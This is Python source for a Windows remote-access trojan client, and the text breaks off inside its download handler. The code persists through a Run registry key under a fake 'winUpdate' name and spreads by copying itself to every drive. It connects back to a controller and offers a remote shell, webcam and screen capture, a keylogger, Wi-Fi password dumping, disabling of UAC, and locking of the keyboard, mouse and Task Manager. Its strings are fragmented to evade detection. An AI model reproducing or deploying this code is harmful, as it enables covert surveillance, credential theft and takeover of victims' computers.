import random
import socket, subprocess, os, platform
from PIL import Image
from win32api import GetLogicalDriveStrings, MessageBox
from win32gui import SendMessage
from win32file import CreateFile
from win32con import HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, GENERIC_WRITE, GENERIC_READ, FILE_SHARE_WRITE, FILE_SHARE_READ, FILE_SHARE_DELETE, CREATE_ALWAYS
from datetime import datetime
from ctypes import windll, cast, POINTER
from comtypes import CLSCTX_ALL
from winreg import *
import winreg as wreg
import shutil
import glob
import ctypes
import sys
import webbrowser
import re
import pyautogui
import cv2
import urllib.request
import json
from winreg import HKEY_CURRENT_USER as HKCU
from winreg import HKEY_LOCAL_MACHINE as HKLM

class CLIENT:

    def f1(self, p1="br", p2=False): # p - e-> r - s >- i - sten -> ce
        
        s1 = 'So'
        s2 = 'ftware\Mi'
        s3 = 'croso'
        s4 = 'ft\W'
        s5 = 'indows\Cu'
        s6 = 'rrentV'
        s7 = 'ersion\R'
        s8 = 'un'
        
        r1 = s1 + s2 + s3 + s4 + s5 + s6 + s7 + s8  
        
        p3 = sys.executable

        try:
            
            r2 = wreg.HKEY_LOCAL_MACHINE if p2 else wreg.HKEY_CURRENT_USER
            r3 = wreg.KEY_WRITE if not p2 else wreg.KEY_WRITE | wreg.KEY_WOW64_64KEY
            
            
            r4 = wreg.OpenKey(r2, r1,(4-3-1), r3)
            
            
            t1 = p1
            t2 = 0
            t3 = wreg.REG_SZ
            t4 = p3
            

            a1 = ''.join([t1])  
            a2 = t2
            a3 = t3
            a4 = t4
            
            wreg.SetValueEx(r4, a1, a2, a3, a4)
            wreg.CloseKey(r4)

            msg1 = f'{a1} ad'
            msg2 = 'ded to '
            msg3 = f'{r2} Ru'
            msg4 = 'n reg'
            msg5 = 'istry key'

            return True, msg1 + msg2 + msg3 + msg4 + msg5

        except PermissionError:
            err1 = 'Ins'
            err2 = 'ufficient '
            err3 = 'permissions '
            err4 = 'to '
            err5 = 'modify '
            err6 = 'HKLM. '
            err7 = 'Try '
            err8 = 'using '
            err9 = 'HKCU.'
            
            return False, ''.join([err1, err2, err3, err4, err5, err6, err7, err8, err9])
            
        except WindowsError as e:
            err_msg1 = 'Failed '
            err_msg2 = 'to '
            err_msg3 = 'apply '
            err_msg4 = 'Run '
            err_msg5 = 'registry '
            err_msg6 = 'key: '
            
            return False, ''.join([err_msg1, err_msg2, err_msg3, err_msg4, err_msg5, err_msg6, str(e)])

    def f2(path): # p r -> opag- > ate
        drives = [drive for drive in 'ABCDEFGHI' + 'JKLMNOPQRSTUVWXYZ' if os.path.exists(f"{drive}:/")]
        for drive in drives:
            try:
                shutil.copy(path, f"{drive}:/winU" + "pdate.e" + "xe")
            except Exception as e:
                continue

    def __init__(self, h1, p1):
        self.host = h1
        self.port = p1

        v1 = h1
        v2 = p1

        p3 = "win" + "Update_" + "Is" + "idroJa" + "vierG" + "arciaF" + "ernandez"
        p4 = False
        
        s1, s2 = self.f1(p1=p3, p2=p4)
        
        
        print(s2)  
        
        
        d1 = os.getcwd()
        self.curdir = d1

        self.f2(d1 + "/dist/client.exe")

    def build_connection(self):
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        sending = socket.gethostbyname(socket.gethostname())

        s.send(sending.encode())
    
    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)
    
    def execute(self):
        while True:
            c1 = s.recv(1024).decode()
            
            if c1 == 'scr' + 'een' + 'sh' + 'are':
                try:
                    from vidstream import ScreenShareClient as ssc
                    v1 = ssc(self.host, 8080)
                    v1.start_stream()
                except:
                    s.send("Impos" + "sible to get screen".encode())
            
            elif c1 == 'we' + 'bcam':
                try:
                    from vidstream import CameraClient as cc
                    v2 = cc(self.host, 8080)
                    v2.start_stream()
                except:
                    s.send("Impos" + "sible to get webcam".encode())
            
            elif c1 == 'sh' + 'ell':
                while 1:
                    c1 = s.recv(1024).decode()
                    if c1.lower() == 'exit' :
                        break
                    if c1 == 'cd':
                        os.chdir(c1[3:].decode('utf-8'))
                        dir = os.getcwd()
                        dir1 = str(dir)
                        s.send(dir1.encode())
                    output = subprocess.getoutput(c1)
                    s.send(output.encode())
                    if not output:
                        self.errorsend()
            
            elif c1 == 'brea' + 'kstream':
                pass

            elif c1 == 'list':
                pass

            elif c1 == 'ge' + 'olo' + 'cate':
                u1 = "https://"
                u2 = "geolocation-db.com/"
                u3 = "json"
                link = u1 + u2 + u3
                
                with urllib.request.urlopen(link) as r1:
                    data = json.loads(r1.read().decode())
                    
                    l1 = "ht" + "tp://" + "ww" + "w.goo" + "gle.c" + "om/ma" + "ps/place/"
                    lat = str(data['latitude'])
                    lon = str(data['longitude'])
                    
                    l2 = f"{lat},{lon}"
                    final_link = l1 + l2
                    
                s.send(final_link.encode())
            
            elif c1 == 'se' + 'tvalue':
                
                r1 = s.recv(1024).decode()  
                r2 = s.recv(1024).decode()  
                r3 = s.recv(1024).decode()  
                r4 = s.recv(1024).decode()  

                try:
                    
                    a1 = 'HKEY_'
                    a2 = 'CURRENT_'
                    a3 = 'USER'
                    reg_key1 = a1 + a2 + a3

                    b1 = 'HKEY_'
                    b2 = 'CLASSES_'
                    b3 = 'ROOT'
                    reg_key2 = b1 + b2 + b3

                    c1 = 'HKEY_'
                    c2 = 'LOCAL_'
                    c3 = 'MACHINE'
                    reg_key3 = c1 + c2 + c3

                    d1 = 'HKEY_'
                    d2 = 'USERS'
                    reg_key4 = d1 + d2

                    e1 = 'HKEY_'
                    e2 = 'CURRENT_'
                    e3 = 'CONFIG'
                    reg_key5 = e1 + e2 + e3
                    
                    
                    consts = {
                        reg_key1: HKEY_CURRENT_USER,
                        reg_key2: HKEY_CLASSES_ROOT,
                        reg_key3: HKEY_LOCAL_MACHINE,
                        reg_key4: HKEY_USERS,
                        reg_key5: HKEY_CURRENT_CONFIG
                    }

                    
                    if r1 in consts:
                        k1 = consts[r1]  
                        k2 = OpenKey(k1, r2,(4-3-1), KEY_ALL_ACCESS)
                        SetValueEx(k2, r3,(4-3-1), REG_SZ, str(r4))
                        CloseKey(k2)
                        s.send("Value is set".encode())
                    
                except Exception as e:
                    
                    err_msg = "Impos" + "sible to create key"
                    s.send(err_msg.encode())
            
            elif c1 == 'de' + 'lkey':
                
                v1 = s.recv(1024).decode()  
                v2 = s.recv(1024).decode()  

                try:
                    
                    x1 = 'HKEY_'
                    x2 = 'CURRENT_'
                    x3 = 'USER'
                    reg_key1 = x1 + x2 + x3

                    y1 = 'HKEY_'
                    y2 = 'LOCAL_'
                    y3 = 'MACHINE'
                    reg_key2 = y1 + y2 + y3

                    z1 = 'HKEY_'
                    z2 = 'USERS'
                    reg_key3 = z1 + z2

                    w1 = 'HKEY_'
                    w2 = 'CLASSES_'
                    w3 = 'ROOT'
                    reg_key4 = w1 + w2 + w3

                    v3 = 'HKEY_'
                    v4 = 'CURRENT_'
                    v5 = 'CONFIG'
                    reg_key5 = v3 + v4 + v5
                    
                    
                    if v1 == reg_key1:
                        DeleteKeyEx(HKEY_CURRENT_USER, v2, KEY_ALL_ACCESS, 0)
                    elif v1 == reg_key2:
                        DeleteKeyEx(HKEY_LOCAL_MACHINE, v2, KEY_ALL_ACCESS, 0)
                    elif v1 == reg_key3:
                        DeleteKeyEx(HKEY_USERS, v2, KEY_ALL_ACCESS, 0)
                    elif v1 == reg_key4:
                        DeleteKeyEx(HKEY_CLASSES_ROOT, v2, KEY_ALL_ACCESS, 0)
                    elif v1 == reg_key5:
                        DeleteKeyEx(HKEY_CURRENT_CONFIG, v2, KEY_ALL_ACCESS, 0)
                    
                    s.send("Key is deleted".encode())
                
                except Exception as e:
                    
                    err_msg = "Impos" + "sible to delete key"
                    s.send(err_msg.encode())
            
            elif c1 == 'crea' + 'tek' + 'ey':
                
                p1 = s.recv(1024).decode()  
                p2 = s.recv(1024).decode()  

                try:
                    
                    k1 = 'HKEY_'
                    k2 = 'CURRENT_'
                    k3 = 'USER'
                    reg_key1 = k1 + k2 + k3

                    m1 = 'HKEY_'
                    m2 = 'LOCAL_'
                    m3 = 'MACHINE'
                    reg_key2 = m1 + m2 + m3

                    n1 = 'HKEY_'
                    n2 = 'USERS'
                    reg_key3 = n1 + n2

                    o1 = 'HKEY_'
                    o2 = 'CLASSES_'
                    o3 = 'ROOT'
                    reg_key4 = o1 + o2 + o3

                    q1 = 'HKEY_'
                    q2 = 'CURRENT_'
                    q3 = 'CONFIG'
                    reg_key5 = q1 + q2 + q3
                    
                    
                    if p1 == reg_key1:
                        CreateKeyEx(HKEY_CURRENT_USER, p2,(4-3-1), KEY_ALL_ACCESS)
                    elif p1 == reg_key2:
                        CreateKeyEx(HKEY_LOCAL_MACHINE, p2,(4-3-1), KEY_ALL_ACCESS)
                    elif p1 == reg_key3:
                        CreateKeyEx(HKEY_USERS, p2,(4-3-1), KEY_ALL_ACCESS)
                    elif p1 == reg_key4:
                        CreateKeyEx(HKEY_CLASSES_ROOT, p2,(4-3-1), KEY_ALL_ACCESS)
                    elif p1 == reg_key5:
                        CreateKeyEx(HKEY_CURRENT_CONFIG, p2,(4-3-1), KEY_ALL_ACCESS)
                    
                    s.send("Key is created".encode())
                
                except Exception as e:
                    
                    err_msg = "Impos" + "sible to create key"
                    s.send(err_msg.encode())
            
            elif c1 == 'volu' + 'meup':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute((1-1), None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    s.send("Volume is increased to 100%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif c1 == 'volu' + 'medown':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    s.send("Volume is decreased to 0%".encode())
                except:
                    s.send("Module is not founded".encode())
            
            elif c1 == 'setw' + 'allpaper':
                pic = s.recv(6000).decode()
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, (1-1), pic, 0)
                    s.send(f'{pic} is set as a wallpaper'.encode())
                except:
                    s.send("No such file")

            elif c1 == 'usbd' + 'rivers':
                part1_usb_1 = "p"
                part1_usb_2 = "o"
                part1_usb_3 = "w"
                part1_usb_4 = "e"
                part1_usb_5 = "r"
                part1_usb_6 = "s"
                part1_usb_7 = "h"
                part1_usb_8 = "e"
                part1_usb_9 = "l"
                part1_usb_10 = "."
                part1_usb_11 = "e"
                part1_usb_12 = "x"
                part1_usb_13 = "e"

                part1_usb = ''.join([part1_usb_1, part1_usb_2, part1_usb_3, part1_usb_4, part1_usb_5, part1_usb_6, part1_usb_7, part1_usb_8, part1_usb_9, part1_usb_10, part1_usb_11, part1_usb_12, part1_usb_13])  # "powershell.exe"

                part2_usb_1 = "G"
                part2_usb_2 = "e"
                part2_usb_3 = "t"
                part2_usb_4 = "-"
                part2_usb_5 = "P"
                part2_usb_6 = "n"
                part2_usb_7 = "p"
                part2_usb_8 = "D"
                part2_usb_9 = "e"
                part2_usb_10 = "v"
                part2_usb_11 = "i"
                part2_usb_12 = "c"
                part2_usb_13 = "e"
                part2_usb_14 = " "
                part2_usb_15 = "-"
                part2_usb_16 = "P"
                part2_usb_17 = "r"
                part2_usb_18 = "e"
                part2_usb_19 = "s"
                part2_usb_20 = "e"
                part2_usb_21 = "n"
                part2_usb_22 = "t"
                part2_usb_23 = "O"
                part2_usb_24 = "n"
                part2_usb_25 = "l"
                part2_usb_26 = "y"
                part2_usb_27 = " "
                part2_usb_28 = "|"
                part2_usb_29 = " "
                part2_usb_30 = "W"
                part2_usb_31 = "h"
                part2_usb_32 = "e"
                part2_usb_33 = "r"
                part2_usb_34 = "-"

                part2_usb_35 = "O"
                part2_usb_36 = "b"
                part2_usb_37 = "j"
                part2_usb_38 = "e"
                part2_usb_39 = "c"
                part2_usb_40 = "t"
                part2_usb_41 = " "
                part2_usb_42 = "{"
                part2_usb_43 = " "
                part2_usb_44 = "$"
                part2_usb_45 = "_"
                part2_usb_46 = "."
                part2_usb_47 = "I"
                part2_usb_48 = "n"
                part2_usb_49 = "s"
                part2_usb_50 = "t"
                part2_usb_51 = "a"
                part2_usb_52 = "n"
                part2_usb_53 = "c"
                part2_usb_54 = "e"
                part2_usb_55 = "I"
                part2_usb_56 = "d"
                part2_usb_57 = " "
                part2_usb_58 = "-"
                part2_usb_59 = "m"
                part2_usb_60 = "a"
                part2_usb_61 = "t"
                part2_usb_62 = "c"
                part2_usb_63 = "h"
                part2_usb_64 = " "
                part2_usb_65 = "'"
                part2_usb_66 = "^"
                part2_usb_67 = "U"
                part2_usb_68 = "S"
                part2_usb_69 = "B"
                part2_usb_70 = "'"
                part2_usb_71 = " "
                part2_usb_72 = "}"

                command_usb = [part1_usb, part2_usb_1, part2_usb_2, part2_usb_3, part2_usb_4, part2_usb_5, part2_usb_6, part2_usb_7, part2_usb_8, part2_usb_9, part2_usb_10,
                            part2_usb_11, part2_usb_12, part2_usb_13, part2_usb_14, part2_usb_15, part2_usb_16, part2_usb_17, part2_usb_18, part2_usb_19, part2_usb_20,
                            part2_usb_21, part2_usb_22, part2_usb_23, part2_usb_24, part2_usb_25, part2_usb_26, part2_usb_27, part2_usb_28, part2_usb_29, part2_usb_30,
                            part2_usb_31, part2_usb_32, part2_usb_33, part2_usb_34, part2_usb_35, part2_usb_36, part2_usb_37, part2_usb_38, part2_usb_39, part2_usb_40,
                            part2_usb_41, part2_usb_42, part2_usb_43, part2_usb_44, part2_usb_45, part2_usb_46, part2_usb_47, part2_usb_48, part2_usb_49, part2_usb_50,
                            part2_usb_51, part2_usb_52, part2_usb_53, part2_usb_54, part2_usb_55, part2_usb_56, part2_usb_57, part2_usb_58, part2_usb_59, part2_usb_60,
                            part2_usb_61, part2_usb_62, part2_usb_63, part2_usb_64, part2_usb_65, part2_usb_66, part2_usb_67, part2_usb_68, part2_usb_69, part2_usb_70,
                            part2_usb_71, part2_usb_72]

                full_command_usb = ''.join(command_usb)

                p = subprocess.check_output(full_command_usb.split(), encoding='utf-8')
                s.send(p.encode())
            
            elif c1 == 'mon' +'itors':
                part1_mon_1 = "p"
                part1_mon_2 = "o"
                part1_mon_3 = "w"
                part1_mon_4 = "e"
                part1_mon_5 = "r"
                part1_mon_6 = "s"
                part1_mon_7 = "h"
                part1_mon_8 = "e"
                part1_mon_9 = "l"
                part1_mon_10 = "."
                part1_mon_11 = "e"
                part1_mon_12 = "x"
                part1_mon_13 = "e"

                part1_mon = ''.join([part1_mon_1, part1_mon_2, part1_mon_3, part1_mon_4, part1_mon_5, part1_mon_6, part1_mon_7, part1_mon_8, part1_mon_9, part1_mon_10, part1_mon_11, part1_mon_12, part1_mon_13])  # "powershell.exe"

                part2_mon_1 = "G"
                part2_mon_2 = "e"
                part2_mon_3 = "t"
                part2_mon_4 = "-"
                part2_mon_5 = "C"
                part2_mon_6 = "i"
                part2_mon_7 = "m"
                part2_mon_8 = "I"
                part2_mon_9 = "n"
                part2_mon_10 = "s"
                part2_mon_11 = "t"
                part2_mon_12 = "a"
                part2_mon_13 = "n"
                part2_mon_14 = "c"
                part2_mon_15 = "e"
                part2_mon_16 = " "
                part2_mon_17 = "-"
                part2_mon_18 = "N"
                part2_mon_19 = "a"
                part2_mon_20 = "m"
                part2_mon_21 = "e"
                part2_mon_22 = "s"
                part2_mon_23 = "p"
                part2_mon_24 = "a"
                part2_mon_25 = "c"
                part2_mon_26 = "e"
                part2_mon_27 = " "
                part2_mon_28 = "r"
                part2_mon_29 = "o"
                part2_mon_30 = "o"
                part2_mon_31 = "t"
                part2_mon_32 = "\\"
                part2_mon_33 = "w"
                part2_mon_34 = "m"
                part2_mon_35 = "i"
                part2_mon_36 = " "
                part2_mon_37 = "-"
                part2_mon_38 = "C"
                part2_mon_39 = "l"
                part2_mon_40 = "a"
                part2_mon_41 = "s"
                part2_mon_42 = "s"
                part2_mon_43 = "N"
                part2_mon_44 = "a"
                part2_mon_45 = "m"
                part2_mon_46 = "e"
                part2_mon_47 = " "
                part2_mon_48 = "W"
                part2_mon_49 = "m"
                part2_mon_50 = "i"
                part2_mon_51 = "M"
                part2_mon_52 = "o"
                part2_mon_53 = "n"
                part2_mon_54 = "i"
                part2_mon_55 = "t"
                part2_mon_56 = "o"
                part2_mon_57 = "r"
                part2_mon_58 = "B"
                part2_mon_59 = "a"
                part2_mon_60 = "s"
                part2_mon_61 = "i"
                part2_mon_62 = "c"
                part2_mon_63 = "D"
                part2_mon_64 = "i"
                part2_mon_65 = "s"
                part2_mon_66 = "p"
                part2_mon_67 = "l"
                part2_mon_68 = "a"
                part2_mon_69 = "y"
                part2_mon_70 = "P"
                part2_mon_71 = "a"
                part2_mon_72 = "r"
                part2_mon_73 = "a"
                part2_mon_74 = "m"
                part2_mon_75 = "s"

                command_monitors = [
                    part1_mon, part2_mon_1, part2_mon_2, part2_mon_3, part2_mon_4,
                    part2_mon_5, part2_mon_6, part2_mon_7, part2_mon_8, part2_mon_9,
                    part2_mon_10, part2_mon_11, part2_mon_12, part2_mon_13, part2_mon_14,
                    part2_mon_15, part2_mon_16, part2_mon_17, part2_mon_18, part2_mon_19,
                    part2_mon_20, part2_mon_21, part2_mon_22, part2_mon_23, part2_mon_24,
                    part2_mon_25, part2_mon_26, part2_mon_27, part2_mon_28, part2_mon_29,
                    part2_mon_30, part2_mon_31, part2_mon_32, part2_mon_33, part2_mon_34,
                    part2_mon_35, part2_mon_36, part2_mon_37, part2_mon_38, part2_mon_39,
                    part2_mon_40, part2_mon_41, part2_mon_42, part2_mon_43, part2_mon_44,
                    part2_mon_45, part2_mon_46, part2_mon_47, part2_mon_48, part2_mon_49,
                    part2_mon_50, part2_mon_51, part2_mon_52, part2_mon_53, part2_mon_54,
                    part2_mon_55, part2_mon_56, part2_mon_57, part2_mon_58, part2_mon_59,
                    part2_mon_60, part2_mon_61, part2_mon_62, part2_mon_63, part2_mon_64,
                    part2_mon_65, part2_mon_66, part2_mon_67, part2_mon_68, part2_mon_69,
                    part2_mon_70, part2_mon_71, part2_mon_72, part2_mon_73, part2_mon_74,
                    part2_mon_75
                ]
                
                # Unir las partes para formar el comando completo
                full_command_monitors = ''.join(command_monitors)

                p = subprocess.check_output(full_command_monitors.split(), encoding='utf-8')
                s.send(p.encode())

            elif c1 == 'sy' + 'sin' + 'fo':
                sysinfo = str(f'''
                    System: {platform.platform()} {platform.win32_edition()}
                    Architecture: {platform.architecture()}
                    Name of Computer: {platform.node()}
                    Processor: {platform.processor()}
                    Python: {platform.python_version()}
                    Java: {platform.java_ver()}
                    User: {os.getlogin()}
                ''')
                s.send(sysinfo.encode())
            
            elif c1 == 'reb' + 'oot':
                os.system("shutdown /r /t 1")
                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
            
            elif c1[:7] == 'writ' + 'ein':
                pyautogui.write(c1.split(" ")[1])
                s.send(f'{c1.split(" ")[1]} is written'.encode())
            
            elif c1[:8] == 'rea' + 'dfile':
                try:
                    f = open(c1[9:], 'r')
                    data = f.read()
                    if not data: s.send("No data".encode())
                    f.close()
                    s.send(data.encode())
                except:
                    s.send("No such file in directory".encode())
            
            elif c1[:7] == 'absp' + 'ath':
                try:
                    path = os.path.abspath(c1[8:])
                    s.send(path.encode())
                except:
                    s.send("No such file in directory".encode())

            elif c1 == 'pw' + 'd':
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif c1 == 'ipc' + 'onfig':
                output = subprocess.check_output('ipconfig', encoding='oem')
                s.send(output.encode())
            
            elif c1 == 'po' + 'rtscan':
                output = subprocess.check_output('netstat -an', encoding='oem')
                s.send(output.encode())
            
            elif c1 == 'tas' + 'klist':
                output = subprocess.check_output('tasklist', encoding='oem')
                s.send(output.encode())

            elif c1 == 'prof' + 'iles':
                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                s.send(output.encode())
            
            elif c1 == 'prof' + 'ile ' + 'pswd':
                profile = s.recv(6000)
                profile = profile.decode()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif c1 == 'sys' + 'temin' + 'fo':
                output = subprocess.check_output(f'systeminfo', encoding='oem')
                s.send(output.encode())
            
            elif c1 == 'send' + 'mes ' + 'sage':
                text = s.recv(6000).decode()
                title = s.recv(6000).decode()
                s.send('MessageBox has appeared'.encode())
                MessageBox(0, text, title)
            
            elif c1.startswith("disable") and c1.endswith("--all"):
                filename11 = s.recv(2147483647)
                newfile = open(filename11, 'wb')
                data = s.recv(2147483647)
                newfile.write(data)
                newfile.close()
                os.startfile(filename11)
                s.send("Keyboard and mouse are disabled".encode())
            
            elif c1.startswith("disable") and c1.endswith("--keyboard"):
                filename11 = s.recv(2147483647)
                newfile = open(filename11, 'wb')
                data = s.recv(2147483647)
                newfile.write(data)
                newfile.close()
                os.startfile(filename11)
                s.send("Keyboard is disabled".encode())
            
            elif c1.startswith("disable") and c1.endswith("--mouse"):
                filename11 = s.recv(2147483647)
                newfile = open(filename11, 'wb')
                data = s.recv(2147483647)
                newfile.write(data)
                newfile.close()
                os.startfile(filename11)
                s.send("Mouse is disabled".encode())
            
            elif c1 == 'disa' + 'bleUAC':
                part1_d = "reg.exe "
                part2_d = "ADD "
                part3_d = "HKLM\\"
                part4_d = "SOFTWARE\\"
                part5_d = "Microsoft\\"
                part6_d = "Windows\\"
                part7_d = "CurrentVersion\\"
                part8_d = "Policies\\"
                part9_d = "System "
                part10_d = "/v "
                part11_d = "EnableLUA "
                part12_d = "/t "
                part13_d = "REG_DWORD "
                part14_d = "/d "
                part15_d = "0 "
                part16_d = "/f"

                cmd_disableUAC = ''.join([part1_d, part2_d, part3_d, part4_d, part5_d,
                                        part6_d, part7_d, part8_d, part9_d, part10_d,
                                        part11_d, part12_d, part13_d, part14_d, part15_d,
                                        part16_d])

                os.system(cmd_disableUAC)

            elif c1.startswith("ena" + "ble") and c1.endswith("--key" + "board"):
                try:
                    part1_k = "TASKKILL "
                    part2_k = "/F "
                    part3_k = "/IM "
                    part4_k = "ke" + "yboar" + "ddis" + "abler.exe"

                    cmd_kill = ''.join([part1_k, part2_k, part3_k, part4_k])
                    os.system(cmd_kill)
                    
                    part1_r = "ke" + "yboar" + "ddisab" + "ler.exe"
                    os.remove(part1_r)

                    msg_enabled = "Keyboard is enabled"
                    s.send(msg_enabled.encode())
                except:
                    msg_error = "Impossible to enable keyboard. Probably the application has already been removed"
                    s.send(msg_error.encode())

            elif c1.startswith("enable") and c1.endswith("--mo" + "use"):
                try:
                    part1_m = "TASKKILL "
                    part2_m = "/F "
                    part3_m = "/IM "
                    part4_m = "blockmouse.exe"

                    cmd_mouse_kill = ''.join([part1_m, part2_m, part3_m, part4_m])
                    os.system(cmd_mouse_kill)

                    part1_remove_mouse = "blockmouse.exe"
                    os.remove(part1_remove_mouse)

                    msg_mouse_enabled = "Mouse is enabled"
                    s.send(msg_mouse_enabled.encode())
                except:
                    msg_mouse_error = "Impossible to enable mouse. Probably the application has already been removed"
                    s.send(msg_mouse_error.encode())

            elif c1.startswith("enable") and c1.endswith("--all"):
                try:
                    part1_all = "TASKKILL "
                    part2_all = "/F "
                    part3_all = "/IM "
                    part4_all = "alldisabler.exe"

                    cmd_all_kill = ''.join([part1_all, part2_all, part3_all, part4_all])
                    os.system(cmd_all_kill)

                    part1_remove_all = "alldi" + "sabler.exe"
                    os.remove(part1_remove_all)

                    msg_all_enabled = "Keyboard and mouse are enabled"
                    s.send(msg_all_enabled.encode())
                except:
                    msg_all_error = "Impossible to enable keyboard and mouse. Probably the application has already been removed"
                    s.send(msg_all_error.encode())

            elif c1 == 'turno' + 'ffmon':
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
                SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            
            elif c1 == 'turn' + 'onmon':
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
                SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            
            elif c1 == 'ext' + 'endrights':
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                s.send(sending.encode())
            
            elif c1 == 'isu' + 'seradmin':
                if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                    s.send(sending.encode())
                else:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                    s.send(sending.encode())

            elif c1 == 'key' + 'scan_st' + 'art':
                filename21 = s.recv(2147483647)
                newfile = open(filename21, 'wb')
                data = s.recv(2147483647)
                newfile.write(data)
                newfile.close()
                os.startfile(filename21)
                s.send("Keylogger is started".encode())
            
            elif c1 == 'sen' + 'd_logs':
                part1_send = "keylogs.txt"
                
                with open(part1_send, 'r') as f:
                    lines = f.readlines()
                
                msg_logs = str(lines)
                s.send(msg_logs.encode())

                part1_remove_logs = "keylogs.txt"
                os.remove(part1_remove_logs)

            elif c1 == 'st' + 'op_keyl' + 'ogger':
                part1_kill = "TASKKILL "
                part2_kill = "/F "
                part3_kill = "/IM "
                part4_kill = "key" + "logg" + "er.exe"

                cmd_keylogger_kill = ''.join([part1_kill, part2_kill, part3_kill, part4_kill])
                os.system(cmd_keylogger_kill)

                part1_remove_keylogger = "key" + "logg" + "er.exe"
                part2_remove_logs = "keylogs.txt"

                os.remove(part1_remove_keylogger)
                os.remove(part2_remove_logs)

                msg_termination = "The session of keylo" + "gger is terminated"
                s.send(msg_termination.encode())

            elif c1 == 'cp' + 'u_co' + 'res':
                output = os.cpu_count()
                s.send(str(output).encode())

            elif c1[:7] == 'de' + 'lfile':
                try:
                    os.remove(c1[8:])
                    s.send(f'{c1[8:]} was successfully deleted'.encode())
                except:
                    self.errorsend()
            
            elif c1[:8] == 'ed' + 'itfile':
                try:
                    with open(c1.split(" ")[1], 'a') as f:
                        f.write(c1.split(" ")[2])
                        f.close()
                    sending = f'{c1.split(" ")[2]} was written to {c1.split(" ")[1]}'
                    s.send(sending.encode())
                except:
                    self.errorsend()
            
            elif c1[:2] == 'cp':
                try: 
                    shutil.copyfile(c1.split(" ")[1], c1.split(" ")[2])
                    s.send(f'{c1.split(" ")[1]} was copied to {c1.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif c1[:2] == 'mv':
                try:
                    shutil.move(c1.split(" ")[1], c1.split(" ")[2])
                    s.send(f'File was moved from {c1.split(" ")[1]} to {c1.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif c1[:2] == 'cd':
                c1 = c1[3:]
                try:
                    os.chdir(c1)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except:
                    s.send("No such directory".encode())
            
            elif c1 == 'cd ..':
                os.chdir('..')
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif c1 == 'dir':
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif c1[1:2] == ':':
                try:
                    os.chdir(c1)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except: 
                    s.send("No such directory".encode())
            
            elif c1[:10] == 'creat' + 'efile':
                CreateFile(c1[11:], GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , (2 - 1-1), (34 + 2 - 36))
                s.send(f'{c1[11:]} was created'.encode())

            elif c1[:10] == 'sea' + 'rchfile':
                for x in glob.glob(c1.split(" ")[2]+"\\**\*", recursive=True):
                    if x.endswith(c1.split(" ")[1]):
                        path = os.path.abspath(x)
                        s.send(str(path).encode())
                    else:
                        continue
            
            elif c1 == 'cur' + 'pid':
                pid = os.getpid()
                s.send(str(pid).encode())
            
            elif c1 == 'dri' + 'vers':
                drivers = GetLogicalDriveStrings().split('\000')[:-1]
                s.send(str(drivers).encode())
            
            elif c1[:4] == 'ki' + 'll':
                try:
                    os.system(f'TASKKILL /F /im {c1[5:]}')
                    s.send(f'{c1[5:]} was terminated'.encode())
                except:
                    self.errorsend()
            
            elif c1 == 'shut' + 'down':
                os.system('shutdown /s /t 1')
                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                s.send()
            
            elif c1 == 'disa' + 'bletas' + 'kmgr':
                filename11 = s.recv(2147483647)
                newfile = open(filename11, 'wb')
                data = s.recv(2147483647)
                newfile.write(data)
                newfile.close()
                os.startfile(filename11)
                s.send("Task Manager is disabled".encode())
            
            elif c1 == 'enabl' + 'etaskmgr':
                os.system("TASKKILL /F /IM bloc" + "ktaskmgr.exe")
                os.remove("block" + "taskmgr.exe")
                s.send("Task Manager is enabled".encode())
            
            elif c1 == 'loca' + 'ltime':
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                s.send(str(current_time).encode())
            
            elif c1[:9] == 'star' + 'tfile':
                try:
                    s.send(f'{c1[10:]} was started'.encode())
                    os.startfile(c1[10:])
                except:
                    self.errorsend()

            elif c1[:8] == 'dow' + 'nload':
                try:
                    file = open(c1.split(" ")[1], 'rb')
                    data = file.read()
